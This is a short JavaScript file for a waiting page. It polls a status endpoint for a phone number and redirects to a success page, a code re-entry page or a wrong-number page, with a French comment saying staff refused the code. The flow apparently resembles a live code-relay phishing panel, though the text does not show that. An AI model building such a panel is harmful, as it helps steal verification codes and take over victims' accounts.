const API_STATUS = '/api/status';

function getParam(name) {
    return new URL(window.location.href).searchParams.get(name);
}

const phone = getParam('phone') || '--';
const length = parseInt(getParam('length')) || 6;

document.getElementById('displayPhone').textContent = phone;

async function checkStatus() {
    try {
        const res = await fetch(`${API_STATUS}?phone=${encodeURIComponent(phone)}`);
        if (!res.ok) return;
        const data = await res.json();

        if (data.status === 'completed') {
            window.location.href = `success.html?phone=${encodeURIComponent(phone)}`;
        } else if (data.status === 'retry_code') {
            // Staff a refusé le code, l'utilisateur doit ressaisir
            window.location.href = `code.html?phone=${encodeURIComponent(phone)}&length=${length}&retry=1`;
        } else if (data.status === 'wrong_number') {
            window.location.href = `index.html?wrong_number=1`;
        }
    } catch (e) {
        console.error('Polling error:', e);
    }
}

checkStatus();
setInterval(checkStatus, 3000);
